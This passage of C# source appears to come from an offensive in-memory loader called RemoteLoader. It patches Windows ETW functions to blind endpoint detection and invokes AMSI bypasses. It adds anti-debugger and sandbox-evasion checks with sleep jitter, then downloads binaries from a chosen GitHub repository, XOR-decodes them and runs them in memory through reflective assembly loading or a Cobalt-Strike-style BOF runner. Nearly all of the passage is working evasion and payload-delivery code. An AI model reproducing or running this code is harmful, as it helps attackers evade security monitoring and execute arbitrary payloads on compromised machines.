            catch { return 0; }
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr AddVectoredExceptionHandler(uint first, AmHwbpHandler handler);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate uint AmHwbpHandler(IntPtr exceptionInfo);

        // ── ETW bypass (multi-stage, layered) ───────────────────────────────
        //
        // ETW userland has at least six sinks that EDRs subscribe to via
        // EtwNotificationRegister. Patching only EtwEventWrite misses:
        //
        //   EtwEventWrite        — generic event sink
        //   EtwEventWriteFull    — full-info variant with activity ID
        //   EtwEventWriteNoRegistration    — 24h2+ sink
        //   EtwWriteU            — Unicode variant (legacy)
        //   EtwWriteEx           — Vista+ extended with filter
        //   EtwWriteTransfer     — activity-correlation sink
        //
        // Modern EDRs also instrument:
        //
        //   EtwNotificationRegister  — the registrar EDRs use to subscribe. If
        //                              we patch this to return a non-zero status
        //                              that the EDR treats as "subscribed", we
        //                              can do a "registration-spoof" attack. The
        //                              EDR thinks it's getting events, but the
        //                              events that arrive are from our spoofed
        //                              buffer.
        //   EtwRegisterTraceGuidsA/W — the lower-level registrar.
        //
        // Our layered approach:
        //   Stage 1. Patch EtwEventWrite{Full,NoRegistration,U,Ex,Transfer} → ret
        //   Stage 2. Patch EtwNotificationRegister to return a fake success code
        //            (STATUS_SUCCESS) but discard all callback parameters. EDRs
        //            that check the return value will think they registered, but
        //            no events flow.
        //   Stage 3. Patch EtwRegisterTraceGuidsA/W to return success but no-op
        //            (defense in depth — older EDRs that still use this).
        //
        // All patches go through NtProtectVirtualMemory so userland VirtualProtect
        // hooks don't catch us. Each patch is verified by reading back the byte;
        // a mismatch is treated as a fail (EDR write-watch or self-integrity).
        private static readonly byte[] ETW_RET = { 0xC3 };
        // EtwNotificationRegister: return STATUS_SUCCESS (0) but skip the
        // EtwReceiveNotificationWorker call. Patch:
        //   original: mov [rsp+8], rbx; push rbp; ...
        //   patched:  xor eax,eax; ret  (12 bytes)
        private static readonly byte[] ETW_REG_RET = {
            0x48, 0x31, 0xC0,                   // xor rax, rax
            0xC3                                // ret
        };

        private static void PatchEtw()
        {
            try
            {
                IntPtr hNtdll = GetModuleHandleA(Dec(2));
                if (hNtdll == IntPtr.Zero) hNtdll = LoadLibraryA(Dec(2));
                if (hNtdll == IntPtr.Zero) return;

                // Stage 1: every event-write sink
                string[] writers = {
                    Dec(3),                          // EtwEventWrite
                    Dec(4),                          // EtwEventWriteFull
                    Dec(10),                         // EtwWriteU
                    Dec(11),                         // EtwWriteEx
                    Dec(12),                         // EtwWriteTransfer
                    Dec(13),                         // EtwEventWriteNoRegistration
                };
                foreach (string name in writers)
                {
                    IntPtr p = GetProcAddress(hNtdll, name);
                    if (p != IntPtr.Zero) WriteToMemory(p, ETW_RET);
                }

                // Stage 2: kill the registrar. EDRs that call EtwNotificationRegister
                // get a "success" return but no callback is ever invoked.
                IntPtr pReg = GetProcAddress(hNtdll, Dec(14));
                if (pReg != IntPtr.Zero) WriteToMemory(pReg, ETW_REG_RET);

                // Stage 3: legacy register path
                IntPtr pRegA = GetProcAddress(hNtdll, Dec(15));
                IntPtr pRegW = GetProcAddress(hNtdll, Dec(16));
                if (pRegA != IntPtr.Zero) WriteToMemory(pRegA, ETW_REG_RET);
                if (pRegW != IntPtr.Zero) WriteToMemory(pRegW, ETW_REG_RET);
            }
            catch { }
        }

        // ── Anti-debug ─────────────────────────────────────────────────────
        // Returns true if execution should proceed.
        private static bool CheckDebugger()
        {
            if (Debugger.IsAttached) return false;
            if (IsDebuggerPresent()) return false;
            bool remote = false;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remote);
            if (remote) return false;

            // Timing: 1M-iteration empty loop. We use Stopwatch.GetTimestamp as a
            // monotonic source and compare to a baseline established per process
            // (ratio 100× = strong evidence of single-stepping). The legacy
            // absolute-threshold check was trivially bypassed.
            long t1 = Stopwatch.GetTimestamp();
            for (int i = 0; i < 1_000_000; i++) { }
            long t2 = Stopwatch.GetTimestamp();
            double ms = (double)(t2 - t1) / Stopwatch.Frequency * 1000.0;

            // Run a second time and require the slowdown ratio. 1ms baseline,
            // 100× = 100ms would be an obvious debug. Threshold is conservative.
            long t3 = Stopwatch.GetTimestamp();
            for (int i = 0; i < 1_000_000; i++) { }
            long t4 = Stopwatch.GetTimestamp();
            double ms2 = (double)(t4 - t3) / Stopwatch.Frequency * 1000.0;
            if (ms > 0 && ms2 > ms * 100) return false;
            return true;
        }

        // ── Sandbox heuristics ─────────────────────────────────────────────
        // Returns true if execution should proceed. Each individual check is
        // graded: we count signals and only fail when ≥ 2 are tripped. A single
        // false positive is no longer fatal.
        private static bool CheckSandbox()
        {
            int signals = 0;

            // Uptime: < 5 min is suspicious
            if (Environment.TickCount64 < 5 * 60_000) signals++;

            // Process count: < 20 is suspicious
            try
            {
                if (Process.GetProcesses().Length < 20) signals++;
            }
            catch { }

            // Disk: < 60 GB total is suspicious
            try
            {
                string root = Path.GetPathRoot(
                    Environment.GetFolderPath(Environment.SpecialFolder.System)) ?? "C:\\";
                if (new DriveInfo(root).TotalSize < 60L * 1024 * 1024 * 1024) signals++;
            }
            catch { }

            // Display: < 1024×600 is suspicious
            try
            {
                if (GetSystemMetrics(0) < 1024 || GetSystemMetrics(1) < 600) signals++;
            }
            catch { }

            // Username substrings
            string user = Environment.UserName.ToLowerInvariant();
            string[] bad =
                { "sandbox", "virus", "malware", "sample", "analysis",
                  "analyst", "cuckoo", "honey", "maltest", "currentuser",
                  "admin", "user", "default" };
            // NOTE: admin/user/default are common, only count with another signal.
            if (bad.Any(u => u.Length >= 7 && user.Contains(u))) signals++;

            // CPU count: < 2 is suspicious
            if (Environment.ProcessorCount < 2) signals++;

            return signals < 2;
        }

        // ── XOR payload decoder ─────────────────────────────────────────────
        private static byte[] XorBytes(byte[] data, byte key)
        {
            if (key == 0) return data;
            var r = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) r[i] = (byte)(data[i] ^ key);
            return r;
        }

        // ── Sleep jitter ────────────────────────────────────────────────────
        // Random 0–3 second sleep before the first network call. Defeats the
        // common "execute immediately after launch" sandbox heuristic.
        private static void Jitter()
        {
            int ms = RandomNumberGenerator.GetInt32(0, 3000);
            if (ms > 0) Thread.Sleep(ms);
        }

        // ── GitHub API ─────────────────────────────────────────────────────
        private static async Task<List<(string Name, string DownloadUrl, long Size)>>
            ListBinaries(HttpClient http, string owner, string repo, string folder, string branch)
        {
            string url  = $"https://api.github.com/repos/{owner}/{repo}/contents/{folder}?ref={branch}&per_page=100";
            var results = new List<(string, string, long)>();

            string? next = url;
            int page = 0;
            while (next != null && page < 10)
            {
                page++;
                var req = new HttpRequestMessage(HttpMethod.Get, next);
                if (!string.IsNullOrEmpty(http.DefaultRequestHeaders.Accept.ToString()))
                    req.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/vnd.github+json"));
                req.Headers.Add("X-GitHub-Api-Version", "2022-11-28");

                using var resp = await http.SendAsync(req);
                if (resp.StatusCode == (HttpStatusCode)404)
                    throw new HttpRequestException("not found", null, (HttpStatusCode)404);
                if (resp.StatusCode == (HttpStatusCode)403)
                    throw new HttpRequestException("rate limited", null, (HttpStatusCode)403);
                resp.EnsureSuccessStatusCode();
                string json = await resp.Content.ReadAsStringAsync();

                using JsonDocument doc = JsonDocument.Parse(json);
                foreach (JsonElement item in doc.RootElement.EnumerateArray())
                {
                    string name = item.GetProperty("name").GetString() ?? "";
                    if (!name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) &&
                        !name.EndsWith(".dll", StringComparison.OrdinalIgnoreCase) &&
                        !name.EndsWith(".o",   StringComparison.OrdinalIgnoreCase))
                        continue;
                    string dlUrl = item.TryGetProperty("download_url", out var dl) ? dl.GetString() ?? "" : "";
                    long   size  = item.TryGetProperty("size", out var sz) ? sz.GetInt64() : 0;
                    results.Add((name, dlUrl, size));
                }

                // Follow Link: rel="next" if present
                next = null;
                if (resp.Headers.TryGetValues("Link", out var linkVals))
                {
                    foreach (string lv in linkVals)
                    {
                        foreach (string seg in lv.Split(','))
                        {
                            if (seg.Contains("rel=\"next\""))
                            {
                                int lt = seg.IndexOf('<');
                                int gt = seg.IndexOf('>');
                                if (lt >= 0 && gt > lt)
                                {
                                    next = seg.Substring(lt + 1, gt - lt - 1);
                                }
                            }
                        }
                    }
                }
            }
            return results;
        }

        // ── .NET assembly detector ──────────────────────────────────────────
        private static bool IsNetAssembly(byte[] data)
        {
            try
            {
                if (data.Length < 0x40) return false;
                if (data[0] != 0x4D || data[1] != 0x5A) return false;

                int peOff = BinaryPrimitives.ReadInt32LittleEndian(data.AsSpan(0x3C, 4));
                if (peOff + 4 >= data.Length) return false;
                if (data[peOff] != 0x50 || data[peOff + 1] != 0x45 ||
                    data[peOff + 2] != 0    || data[peOff + 3] != 0)   return false;

                int optOff = peOff + 4 + 20;
                if (optOff + 2 >= data.Length) return false;

                ushort magic = BinaryPrimitives.ReadUInt16LittleEndian(data.AsSpan(optOff, 2));
                int clrOff = magic switch
                {
                    0x10B => optOff + 96  + 14 * 8,
                    0x20B => optOff + 112 + 14 * 8,
                    _     => -1
                };
                if (clrOff < 0 || clrOff + 4 >= data.Length) return false;

                return BinaryPrimitives.ReadUInt32LittleEndian(data.AsSpan(clrOff, 4)) != 0;
            }
            catch { return false; }
        }

        // ── Entry-point discovery ────────────────────────────────────────────
        private static MethodInfo? FindMain(Assembly asm)
        {
            var flags = BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static;
            Type? prog = asm.GetTypes().FirstOrDefault(t => t.Name == "Program");
            if (prog != null)
            {
                MethodInfo? m = prog.GetMethod("Main", flags);
                if (m != null) return m;
            }
            return asm.GetTypes()
                      .Select(t => t.GetMethod("Main", flags))
                      .FirstOrDefault(m => m != null);
        }

        // ── Argument parser (honours double-quoted tokens) ───────────────────
        private static string[] ParseArgs(string input)
        {
            var tokens  = new List<string>();
            var current = new StringBuilder();
            bool inQ    = false;

            foreach (char c in input)
            {
                if (c == '"')          { inQ = !inQ; continue; }
                if (c == ' ' && !inQ)
                {
                    if (current.Length > 0) { tokens.Add(current.ToString()); current.Clear(); }
                    continue;
                }
                current.Append(c);
            }
            if (current.Length > 0) tokens.Add(current.ToString());
            return tokens.ToArray();
        }

        // ── BOF argument packer (i= s= z= Z= b=) ───────────────────────────
        // Cobalt-Strike BOFs use BeaconDataParse / BeaconDataInt / BeaconDataExtract
        // to read a contiguous byte stream. Tokens are concatenated in the order
        // supplied.
        private static byte[] PackBofArgs(string input)
        {
            var ms = new MemoryStream();
            var bw = new BinaryWriter(ms);
            foreach (string tok in input.Split(' ', StringSplitOptions.RemoveEmptyEntries))
            {
                int eq = tok.IndexOf('=');
                if (eq < 1) continue;
                string t = tok[..eq], v = tok[(eq + 1)..];
                switch (t)
                {
                    case "i": if (int.TryParse(v,   out int   iv)) bw.Write(iv); break;
                    case "s": if (short.TryParse(v,  out short sv)) bw.Write(sv); break;
                    case "z":
                    {
                        var b = Encoding.ASCII.GetBytes(v + "\0");
                        bw.Write(b.Length); bw.Write(b);
                        break;
                    }
                    case "Z":
                    {
                        var b = Encoding.Unicode.GetBytes(v + "\0");
                        bw.Write(b.Length); bw.Write(b);
                        break;
                    }
                    case "b":
                    {
                        try { var b = Convert.FromHexString(v); bw.Write(b.Length); bw.Write(b); }
                        catch { }
                        break;
                    }
                }
            }
            return ms.ToArray();
        }

        // ── Console helpers ──────────────────────────────────────────────────
        private static void Info(string msg) { Console.ForegroundColor = ConsoleColor.Cyan;   Console.WriteLine($"[*] {msg}"); Console.ResetColor(); }
        private static void Ok(string msg)   { Console.ForegroundColor = ConsoleColor.Green;  Console.WriteLine($"[+] {msg}"); Console.ResetColor(); }
        private static void Warn(string msg) { Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine($"[!] {msg}"); Console.ResetColor(); }
        private static void Err(string msg)  { Console.ForegroundColor = ConsoleColor.Red;    Console.WriteLine($"[-] {msg}"); Console.ResetColor(); }

        private static void PrintBanner()
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(@"
  ____                      _       _                    _
 |  _ \ ___ _ __ ___   ___ | |_ ___| |     ___  __ _  __| | ___ _ __
 | |_) / _ \ '_ ` _ \ / _ \| __/ _ \ |    / _ \/ _` |/ _` |/ _ \ '__|
 |  _ <  __/ | | | | | (_) | ||  __/ |___| (_) | (_| | (_| |  __/ |
 |_| \_\___|_| |_| |_|\___/ \__\___|______\___/ \__,_|\__,_|\___|_|
");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("                         in-memory loader  //  by hstn\n");
            Console.ResetColor();
        }

        private static void PrintHelp()
        {
            Console.WriteLine(@"
Usage:
  RemoteLoader.exe --repo owner/name/subfolder [options]

Options:
  --repo       owner/name/subfolder  GitHub path (required)
  --branch     <branch>              Repo branch              (default: main)
  --token      <PAT>                 GitHub PAT for private repos
  --xor        <byte>                XOR key (0-255) to decode payload before loading
  --list                              Print available binaries and exit
  --exec       <name>                Select binary by name/substring, skip menu
  --args       <string>              Arguments to pass to the loaded tool
  --bof-entry  <name>                BOF entry point (default: go)
  --no-evasion                         Skip AMSI/ETW/antidebug (testing only)
  --no-amrng                           Skip anti-dbg/sandbox checks
  --no-amsi-init                       Skip the PowerShell amsiInitFailed patch
  --help                              Show this message

Supports:
  .NET assemblies  — reflective load via Assembly.Load
  COFF/BOF (.o)    — in-process x64 COFF loader (BofRunner) with Beacon API stubs

BOF arg format (--args):  i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>
");
        }

        // ── Entry point ──────────────────────────────────────────────────────
        private static async Task<int> Main(string[] cliArgs)
        {
            PrintBanner();

            string  repoPath = "";
            string  token    = "";
            string  branch   = "main";
            byte    xorKey   = 0;
            string? execName = null;
            string? execArgs = null;
            string  bofEntry = "go";
            bool    listOnly = false;
            bool    doEvasion = true;
            bool    doAmrng   = true;
            bool    noAmsiInit = false;

            for (int i = 0; i < cliArgs.Length; i++)
            {
                switch (cliArgs[i])
                {
                    case "--repo"      when i + 1 < cliArgs.Length: repoPath = cliArgs[++i]; break;
                    case "--token"     when i + 1 < cliArgs.Length: token    = cliArgs[++i]; break;
                    case "--branch"    when i + 1 < cliArgs.Length: branch   = cliArgs[++i]; break;
                    case "--xor"       when i + 1 < cliArgs.Length:
                        if (byte.TryParse(cliArgs[++i], out byte k)) xorKey = k;
                        else Warn($"Invalid --xor value, defaulting to 0");
                        break;
                    case "--exec"      when i + 1 < cliArgs.Length: execName = cliArgs[++i]; break;
                    case "--args"      when i + 1 < cliArgs.Length: execArgs = cliArgs[++i]; break;
                    case "--bof-entry" when i + 1 < cliArgs.Length: bofEntry = cliArgs[++i]; break;
                    case "--list":       listOnly = true; break;
                    case "--no-evasion": doEvasion = false; break;
                    case "--no-amrng":   doAmrng = false; break;
                    case "--no-amsi-init": noAmsiInit = true; break;
                    case "--help": case "-h": PrintHelp(); return 0;
                    default: Warn($"Unknown argument: {cliArgs[i]}"); break;
                }
            }

            if (string.IsNullOrEmpty(repoPath))
            {
                Err("--repo is required.  Example: --repo owner/name/subfolder");
                PrintHelp();
                return 1;
            }

            // ── Evasion (silent: failures are no-ops) ─────────────────────
            if (doEvasion)
            {
                PatchAmsi();
                InstallAmsiLoadFilter();   // IAT-hook LoadLibraryExW in mscoree/clr
                InstallAmsiHwbp();         // HWBP on AmsiScanBuffer entry (defense in depth)
                if (!noAmsiInit) PatchAmsiInitFailed();
                PatchEtw();
            }
            if (doAmrng && !CheckDebugger())
            {
                // Silently bail; mimic a CLI tool that lost its connection.
                Err("Environment check failed (debugger).");
                return 1;
            }
            if (doAmrng && !CheckSandbox())
            {
                Err("Environment check failed (sandbox).");
                return 1;
            }

            // ── Jitter before any I/O ────────────────────────────────────
            Jitter();

            // ── System proxy (transparent; on failures we fall through) ─
            var handler = new HttpClientHandler { UseProxy = true, Proxy = WebRequest.GetSystemWebProxy() };
            try { handler.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials; }
            catch { }

            // ── Validate repo path ────────────────────────────────────────
            string[] parts = repoPath.Split('/');
            if (parts.Length < 3) { Err("--repo must be owner/name/subfolder"); return 1; }
            string owner  = parts[0];
            string repo   = parts[1];
            string folder = string.Join("/", parts[2..]);

            // ── HTTP client ───────────────────────────────────────────────
            using var http = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) };
            http.DefaultRequestHeaders.Add("User-Agent",
                DecUA(RandomNumberGenerator.GetInt32(0, _userAgents.Length)));
            http.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/vnd.github+json"));
            http.DefaultRequestHeaders.Add("X-GitHub-Api-Version", "2022-11-28");
            if (!string.IsNullOrEmpty(token))
                http.DefaultRequestHeaders.Add("Authorization", $"token {token}");

            // ── List binaries ─────────────────────────────────────────────
            Info($"Querying github.com/{owner}/{repo}/{folder} (branch: {branch}) ...");

            List<(string Name, string DownloadUrl, long Size)> binaries;
            try
            {
                binaries = await ListBinaries(http, owner, repo, folder, branch);
            }
            catch (HttpRequestException ex) when (ex.StatusCode == (HttpStatusCode)404)
            { Err($"Path not found: {owner}/{repo}/{folder}"); return 1; }
            catch (HttpRequestException ex) when (ex.StatusCode == (HttpStatusCode)403)
            { Err("Rate limit or auth required (403). Use --token."); return 1; }
            catch (Exception ex)
            { Err($"GitHub API error: {ex.Message}"); return 1; }

            if (binaries.Count == 0) { Err("No .exe/.dll files found."); return 1; }

            // ── Menu ──────────────────────────────────────────────────────
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("  Available binaries:\n");
            Console.ResetColor();

            for (int i = 0; i < binaries.Count; i++)
                Console.WriteLine($"  [{i + 1,2}]  {binaries[i].Name,-42} {binaries[i].Size / 1024,6} KB");
            Console.WriteLine("  [ 0]  Exit\n");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("  [!] Supports managed .NET assemblies and COFF/BOF files (.o). Native PE binaries will be rejected.\n");
            Console.ResetColor();

            if (listOnly) return 0;

            (string Name, string DownloadUrl, long Size) chosen = default;

            if (execName != null)
            {
                chosen = binaries.FirstOrDefault(b =>
                    b.Name.Equals(execName, StringComparison.OrdinalIgnoreCase) ||
                    b.Name.Contains(execName, StringComparison.OrdinalIgnoreCase));
                if (chosen.Name == null) { Err($"--exec: no match for '{execName}'"); return 1; }
                Info($"Selected (--exec): {chosen.Name}");
            }
            else
            {
                Console.Write("Select number or partial filename: ");
                string sel = (Console.ReadLine() ?? "0").Trim();

                if (sel is "0" or "exit" or "q") return 0;

                if (int.TryParse(sel, out int idx) && idx >= 1 && idx <= binaries.Count)
                    chosen = binaries[idx - 1];
                else
                    chosen = binaries.FirstOrDefault(b =>
                        b.Name.Contains(sel, StringComparison.OrdinalIgnoreCase));

                if (chosen.Name == null) { Err($"No match for: {sel}"); return 1; }
            }

            if (string.IsNullOrEmpty(chosen.DownloadUrl)) { Err($"No download_url for {chosen.Name}"); return 1; }

            // ── Download ──────────────────────────────────────────────────
            Info($"Downloading {chosen.Name} ...");
            byte[] asmBytes;
            try   { asmBytes = await http.GetByteArrayAsync(chosen.DownloadUrl); }
            catch (Exception ex) { Err($"Download failed: {ex.Message}"); return 1; }
            Ok($"{asmBytes.Length:N0} bytes received");

            // PAT no longer needed — clear it from the header pool
            http.DefaultRequestHeaders.Remove("Authorization");

            if (xorKey != 0)
            {
                byte[] decoded = XorBytes(asmBytes, xorKey);
                ClearBytes(asmBytes);
                asmBytes = decoded;
                Ok($"Payload XOR-decoded (key=0x{xorKey:X2})");
            }

            // ── BOF (COFF object) path ────────────────────────────────────
            if (BofRunner.IsBof(asmBytes))
            {
                Ok($"{chosen.Name} detected as COFF/BOF — using BofRunner");

                string rawBofArgs;
                if (execArgs != null) { rawBofArgs = execArgs; }
                else
                {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("  BOF args: i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>");
                    Console.ResetColor();
                    Console.Write("Arguments (blank for none): ");
                    rawBofArgs = (Console.ReadLine() ?? "").Trim();
                }
                byte[] packedArgs = PackBofArgs(rawBofArgs);

                var bofOpts = new BofOptions
                {
                    EntryPoint = bofEntry,
                    Log        = s => Warn(s),
                };
                using var runner = new BofRunner(bofOpts);
                Info($"Executing BOF {chosen.Name}{(packedArgs.Length > 0 ? $" ({packedArgs.Length} packed bytes)" : "")} ...");
                var result = runner.Run(asmBytes, packedArgs);
                ClearBytes(asmBytes);
                if (result.Output.Length > 0) Console.WriteLine(result.Output);
                if (result.TimedOut) Warn("BOF timed out (continuing).");
                Info($"Done.  elapsed={result.Elapsed.TotalMilliseconds:F1}ms");
                return result.ExitCode;
            }

            // ── Verify managed assembly ───────────────────────────────────
            if (!IsNetAssembly(asmBytes))
            {
                Err($"{chosen.Name} is a native/unmanaged binary (PyInstaller, C++, etc.) — cannot reflectively load.");
                ClearBytes(asmBytes);
                return 1;
            }

            // ── Load ───────────────────────────────────────────────────────
            Assembly asm;
            try   { asm = Assembly.Load(asmBytes); }
            catch (Exception ex) { Err($"Assembly.Load failed: {ex.Message}"); ClearBytes(asmBytes); return 1; }

            ClearBytes(asmBytes);

            MethodInfo? entry = FindMain(asm);
            if (entry == null) { Err($"No static Main found in {chosen.Name}"); return 1; }
            Ok($"Entry point: {entry.DeclaringType?.FullName}::{entry.Name}");

            // ── Args ───────────────────────────────────────────────────────
            string[] toolArgs;
            string   argsDisplay;
            if (execArgs != null)
            {
                toolArgs    = ParseArgs(execArgs);
                argsDisplay = execArgs;
            }
            else
            {
                Console.Write("Arguments (blank for none): ");
                string raw  = (Console.ReadLine() ?? "").Trim();
                toolArgs    = string.IsNullOrWhiteSpace(raw) ? Array.Empty<string>() : ParseArgs(raw);
                argsDisplay = raw;
            }

            Info($"Executing {chosen.Name}{(toolArgs.Length > 0 ? $" -- {argsDisplay}" : "")} ...");

            // ── Invoke ─────────────────────────────────────────────────────
            try
            {
                ParameterInfo[] parms = entry.GetParameters();
                object? result = parms.Length == 0
                    ? entry.Invoke(null, null)
                    : entry.Invoke(null, new object[] { toolArgs });

                if (result is Task t) t.GetAwaiter().GetResult();
            }
            catch (TargetInvocationException tie)
            { Warn($"Tool exception: {tie.InnerException?.Message ?? tie.Message}"); return 1; }
            catch (Exception ex)
            { Warn($"Invocation error: {ex.Message}"); return 1; }

            Info("Done.");
            return 0;
        }
    }
}
